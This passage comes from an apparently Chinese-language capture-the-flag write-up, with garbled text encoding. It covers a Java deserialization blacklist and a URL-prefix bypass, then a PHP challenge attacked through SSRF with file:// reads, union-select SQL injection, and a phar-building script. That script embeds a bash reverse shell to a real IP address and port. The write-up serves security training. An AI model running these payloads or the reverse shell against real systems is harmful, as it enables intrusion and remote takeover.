keyword">return</span> <span class="token string">"File upload failed"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–å’Œæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½</p><p>çœ‹ä¸€ä¸‹utils</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ycbjava<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InvalidClassException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyObjectInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blacklist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"java.security.SignedObject"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.ldap.LdapAttribute"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.commons.beanutils"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.commons.collections"</span><span class="token punctuation">,</span> <span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xpath.internal.objects.XString"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> blacklist<span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">;</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> var3<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var6 <span class="token operator">&lt;</span> var5<span class="token punctuation">;</span> <span class="token operator">++</span>var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> forbiddenPackage <span class="token operator">=</span> var4<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>forbiddenPackage<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€çœ¼blacklist</p><p>è€Œåœ¨ user ä¸­æœ‰</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getGift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> gift <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>    gift <span class="token operator">=</span> gift<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gift <span class="token operator">=</span> gift<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>gift<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">||</span> gift<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        gift <span class="token operator">=</span> <span class="token string">"nonono"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URL</span> url1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>gift<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">URLclass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URLClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> add <span class="token operator">=</span> <span class="token class-name">URLclass</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"addURL"</span><span class="token punctuation">,</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        add<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classloader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">URLClassLoader</span><span class="token punctuation">)</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        add<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>classloader<span class="token punctuation">,</span> url1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> gift<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‰ç¼€æ£€æµ‹è¿™é‡Œç¿»ä¸€ä¸‹ java.net.URLï¼Œå‘ç°å¯ä»¥ç”¨<code>url:</code>ç»•è¿‡</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240828092235138.png" alt="image-20240828092235138"></p><hr><h1 id="ç½‘ç»œç…§ç›¸é¦†ï¼ˆå¤ç°ï¼‰"><a href="#ç½‘ç»œç…§ç›¸é¦†ï¼ˆå¤ç°ï¼‰" class="headerlink" title="ç½‘ç»œç…§ç›¸é¦†ï¼ˆå¤ç°ï¼‰"></a>ç½‘ç»œç…§ç›¸é¦†ï¼ˆå¤ç°ï¼‰</h1><blockquote><p>SSRF + sqlæ³¨å…¥ + CVE-2024-2961</p></blockquote><p>fileåè®®å¯ä»¥è¯»å–æ–‡ä»¶ï¼š<code>file://localhost/var/www/html/url.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//error_reporting(0);</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'sql.php'</span><span class="token punctuation">;</span><span class="token variable">$baseDir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"data/"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$parse</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"urlé”™è¯¯ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$baseDir</span> <span class="token operator">.</span>  <span class="token function">get_filename</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">mysqli_prepare</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">mysqli_stmt_bind_param</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mysqli_stmt_execute</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmpInfo</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$tmpInfo</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>    <span class="token variable">$var_size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$random_str</span><span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$var_size</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">.=</span> <span class="token variable">$random_str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$res</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$conn</span> <span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT filename from data where url = '<span class="token interpolation"><span class="token variable">$url</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_all</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sql.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctfer"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctfer"</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºè¿æ¥</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æµ‹è¿æ¥</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿æ¥å¤±è´¥: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°checkå‡½æ•°ä¸­</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT filename from data where url = '<span class="token interpolation"><span class="token variable">$url</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥æ³¨å…¥</p><p>çˆ†å­—æ®µï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/'union select group_concat(filename,'--',url) from data#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827165222255.png" alt="image-20240827165222255"></p><p>è¯»å–æƒé™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827171017825.png" alt="image-20240827171017825"></p><p>ä½†æ˜¯è¯•äº†åŠå¤©å¹¶ä¸èƒ½å†™å…¥shell</p><blockquote><p>hintï¼šæˆ–è®¸å¯ä»¥å…³æ³¨ä¸€ä¸‹hash_fileå‡½æ•°</p></blockquote><p>é‚£ä¹ˆé‡æ–°æ•´ç†ä¸€ä¸‹æˆ‘ä»¬æŒæ¡çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å†™å…¥æ–‡ä»¶è·¯å¾„çš„å†…å®¹ï¼Œè€Œä¸”å¯ä»¥çŸ¥é“å¯¹åº”æ–‡ä»¶è·¯å¾„çš„ä½ç½®ï¼Œä½†æ˜¯æ–‡ä»¶çš„åç¼€å›ºå®šä¸ºtxt</p><p>æˆ‘ä»¬çŸ¥é“<code>phar://</code>æ˜¯æ— è§†åç¼€çš„ï¼Œé‚£ä¹ˆæ§åˆ¶filenameä¸º<code>phar://xxx.txt</code>å³å¯ï¼Œåœ¨æˆ‘ä»¬çš„vpsä¸Šå‡†å¤‡pharåŒ…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system("bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1\'"); ?>'</span><span class="token punctuation">;</span> <span class="token comment">//ä¸€å¥è¯æœ¨é©¬</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'2.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"3.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">// $phar->setMetadata(...); //åœ¨metadataæ·»åŠ å†…å®¹ï¼Œå¯å‚è€ƒ pharååºåˆ—åŒ–ï¼Œæ­¤å¤„ç”¨ä¸ç€ï¼Œæ•…æ³¨é‡Š</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®©é¶æœºcurlï¼Œä»è€Œä¸Šä¼ pharåŒ…</p><p>ç„¶ååˆ©ç”¨sqlæ³¨å…¥è·å–è·¯å¾„</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827205230975.png" alt="image-20240827205230975"></p><p>è·å–è·¯å¾„ï¼š<code>data/2024-08-27_zspCkaDq.txt</code></p><p>ç„¶åå†æ„é€ sqlæ³¨å…¥æ–‡ä»¶å<code>phar://data/2024-08-27_zspCkaDq.txt/exp.php</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/'union select "phar://data/2024-08-27_zspCkaDq.txt/exp.php"#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯çªç„¶æƒ³èµ·æ¥php8åPharä¸­çš„å…ƒä¿¡æ¯ä¸å†è‡ªåŠ¨è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œå¯„</p><h2 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>åé¢æƒ³äº†æƒ³åº”è¯¥å¯ä»¥æ‰“CVE-2024-2961ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è·å– &#x2F;proc&#x2F;self&#x2F;maps å’Œ libc.soï¼Œç„¶åç”Ÿæˆ path æ¥æ‰“</p><p>æµç¨‹æ˜¯ï¼š</p><p>å…ˆè¯»å– &#x2F;proc&#x2F;self&#x2F;maps</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//localhost/proc/self/maps</span><span aria-hidden="true" 